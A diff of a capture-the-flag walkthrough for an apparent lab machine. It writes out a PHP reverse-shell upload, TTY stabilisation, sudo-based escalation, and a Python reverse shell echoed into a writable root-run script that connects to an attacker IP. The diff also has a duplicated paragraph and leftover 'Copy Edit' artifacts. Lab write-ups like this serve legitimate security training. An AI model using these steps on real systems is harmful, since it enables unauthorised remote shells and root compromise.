@@ -1,69 +1,68 @@
-We start by performing a scan to identify the open ports available:
+We begin by performing a port scan to identify which services are available:
 
-![Descripción de la imagen](./Uploads/Bashed-EscaneoP.png)
+![image.png](./Uploads/Bashed-EscaneoP.png)
 
+We identify that port **80** is open, which immediately suggests we are dealing with an HTTP server. Next, we analyze the services and versions associated with this port to understand what we're working with:
 
+![image.png](./Uploads/Bashed-Versiones.png)
 
+As part of my analysis methodology, I like to anticipate potential attack vectors by enumerating subdirectories early on. For this, I typically use **Gobuster**, as it’s fast and allows for manual control:
 
-We identify that port 80 is open, which immediately suggests we are facing an HTTP server. So, we proceed to analyze the services and versions running on that port:
+![image.png](./Uploads/BashedGobuster.png)
 
+We discover subdirectories like `/images` and `/uploads`, which hint at a potential file upload vector. However, before jumping into exploitation, we visit these subdomains to gather more information:
 
+![image.png](./Uploads/Bashed-ArchivoPhp.png)
 
+Among the subdirectories, `/dev` stands out. Within it, we find `phpbash.php` — a web-based Bash emulator designed for easier directory interaction. This gives us an excellent opportunity to elevate privileges and establish remote access. From here, we move to the `/uploads` directory and attempt to deliver a PHP reverse shell, assuming `.php` file execution is allowed:
 
-Now, in my analysis methodology, I like to get ahead and start checking for available subdomains on the server. I usually use Gobuster because it's very hands-on and fast:
+![image.png](./Uploads/DescargarReverseShell - Copy.png)
 
+We use a basic PHP reverse shell script and, through our pseudo-terminal, perform a brief reconnaissance to prepare the environment. Then we upload the shell by setting up a listener using `nc` (netcat), and configure it to only transfer the reverse shell script:
 
+![image.png](./Uploads/Enumeracion-TerminalWeb.png)
 
-Seeing that we have subdomains like images and uploads, we can already get an idea that there might be an attack vector to upload files to the server. But for now, we’ll visit the subdomains to further enumerate potential attack vectors:
+![image.png](./Uploads/PuertoEscuchaParaReverse.png)
 
+From the pseudo-terminal, we make the request to download the reverse shell script into `/var/www/html/uploads:`  
 
+![image.png](./Uploads/ReverseShellEstablecidaMaquinaVictima.png)
 
-In the /dev subdomain we find the most interesting element: phpbash.php. This is a web app that emulates a bash terminal for directory control convenience. With this in place, we have a broad way to extend permissions and make a remote connection. What we’ll do is move to the uploads directory and from there try to download a PHP reverse shell, since we suspect .php files can be executed:
+Afterward, we execute the uploaded script via the browser and start listening on the configured port to catch the reverse connection. It’s important to edit the PHP shell beforehand to insert your own IP and listening port:
 
-Our PHP reverse shell script:
+![image.png](./Uploads/RutaParaEstablecerLaConexion.png)
 
+Afterward, we execute the uploaded script via the browser and start listening on the configured port to catch the reverse connection. It’s important to edit the PHP shell beforehand to insert your own IP and listening port:
 
+![Tratamiento tty.png](./Uploads/Tratamiento tty.png)
 
-Next, a quick recon in our web pseudo-terminal:
+Once we receive the connection, we treat the TTY session to stabilize the shell and make it more usable (e.g., support for `tab` completion, `clear`, `nano`, etc.). The commands used for TTY stabilization are:
 
-
-
-Now, we’ll upload our reverse shell as follows. We’re going to set a listener port using nc and instruct it to only communicate to transfer the reverse shell:
-
-
-
-Now from the pseudo-terminal, we’ll make the request from the path /var/www/html/uploads:
-
-
-
-Now we execute the full path from the browser and set a port in listen mode with the same port and IP we configured in the reverse shell script (this must be edited with any text editor):
-
-
-
-We receive the connection and will need to treat the TTY. This is useful to execute many common terminal functionalities and avoid easily losing the connection. To do this, we’ll run:
-
-
-
-Once we have the terminal on our listener port, we’ll type:
-
+`bash
 script /dev/null -c bash
-Ctrl+z
+Ctrl+Z
 stty raw -echo ; fg
 reset
 xterm
 export TERM=xterm
-export SHELL=bash
+export SHELL=bash`
 
-Now that we had previously enumerated from the pseudo-terminal, the next step is analyzing how we can escalate privileges vertically to a user with higher permissions, since www-data usually has very limited access.
+With a stable shell, we proceed to privilege escalation. Since we previously enumerated the system via the web terminal, we now focus on identifying ways to escalate from the current www-data user, which has limited privileges.
 
-To do that, we analyze the available sudo permissions with our current user. We notice that we can execute a bash shell as scriptmanager without a password, so we escalate using:
+We check for available sudo permissions and discover that we can execute commands as scriptmanager without a password. This allows us to escalate privileges using:
 
+bash
+Copy
+Edit
 sudo -u scriptmanager bash -i
 
+![Tratamiento tty.png](./Uploads/CambiodeUsuarioAScriptManager.png)
 
+From here, we explore the file system with ls -la / and notice a directory named /scripts. Inside, we find a writable script. We attempt to modify it to spawn a reverse shell using Python and connect back to our system on a new listener port:
 
-We perform general recon with ls -la /, and we notice the presence of a scripts directory. Inside, we find a script with execution permissions. So we attempt to modify its content to establish a reverse shell through Python to a new listener port, by modifying and executing that script:
-
+bash
+Copy
+Edit
 echo 'import socket,subprocess,os' > /scripts/test.py
 echo 's=socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> /scripts/test.py
 echo 's.connect(("10.10.14.21", 9001))' >> /scripts/test.py
@@ -71,12 +70,12 @@ echo 'os.dup2(s.fileno(),0)' >> /scripts/test.py
 echo 'os.dup2(s.fileno(),1)' >> /scripts/test.py
 echo 'os.dup2(s.fileno(),2)' >> /scripts/test.py
 echo 'p=subprocess.call(["/bin/sh", "-i"])' >> /scripts/test.py
+![Tratamiento tty.png](./Uploads/SobreescribiendoScriptEnScriptaManager.png)
+
+After executing this script, we successfully receive a reverse shell as root on our listener:
+![Tratamiento tty.png](./Uploads/Root.png)
 
 
+Finally, we navigate to /home/arrexel to retrieve the user.txt flag, which is readable with a simple cat command:
 
-Now on our listener port, we receive the connection as root:
-
-
-
-Finally, to capture the user flag user.txt, we visit /home/arrexel, and it is available to read using cat.
-
+![Tratamiento tty.png](./Uploads/FlagArrexel.png)
